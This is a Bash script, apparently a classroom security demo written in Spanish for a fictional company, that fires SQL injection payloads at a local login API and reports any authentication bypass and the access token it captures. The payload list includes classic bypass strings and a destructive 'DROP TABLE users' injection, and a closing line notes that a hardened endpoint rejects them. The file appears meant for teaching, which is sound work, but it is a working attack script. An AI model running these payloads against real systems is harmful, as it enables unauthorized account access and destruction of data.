#!/bin/bash
# ============================================================
#  SOFIA SOLUTIONS — SQL Injection Bypass Demo (ASIR)
#  Objetivo: Demostrar bypass de autenticación mediante SQLi
# ============================================================

URL="http://localhost:8001/api/v1/auth/login"

echo "=========================================="
echo "  SOFIA SOLUTIONS — SQL Injection Demo"
echo "=========================================="
echo "[*] Endpoint vulnerable: $URL"
echo ""

PAYLOADS=(
    "' OR 1=1--"
    "' OR '1'='1"
    "admin'--"
    "' OR 1=1; DROP TABLE users;--"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
    echo "[*] Probando payload: $PAYLOAD"
    
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$URL" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$PAYLOAD\",\"password\":\"cualquiera\"}")
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    BODY=$(echo "$RESPONSE" | head -n -1)
    
    if [ "$HTTP_CODE" = "200" ]; then
        VULN_TRIGGERED=$(echo "$BODY" | grep -o '"SQLI_BYPASS"' | wc -l | tr -d ' ')
        TOKEN=$(echo "$BODY" | grep -oP '"accessToken":"\K[^"]+' 2>/dev/null || echo "")
        
        if [ "$VULN_TRIGGERED" -gt 0 ] || [ -n "$TOKEN" ]; then
            echo "[!!!] BYPASS EXITOSO — La inyección funcionó"
            echo "[!!!] Vulnerabilidad: SQLI_BYPASS activada"
            [ -n "$TOKEN" ] && echo "[!!!] Token obtenido: ${TOKEN:0:30}..."
        else
            echo "[+] HTTP 200 recibido"
        fi
    else
        echo "[ ] HTTP $HTTP_CODE — No explotable con este payload"
    fi
    echo ""
    sleep 0.2
done

echo "=========================================="
echo "  FIN DEL ATAQUE SQL INJECTION"
echo "Nota: En /login-secure estos payloads son rechazados"
echo "=========================================="
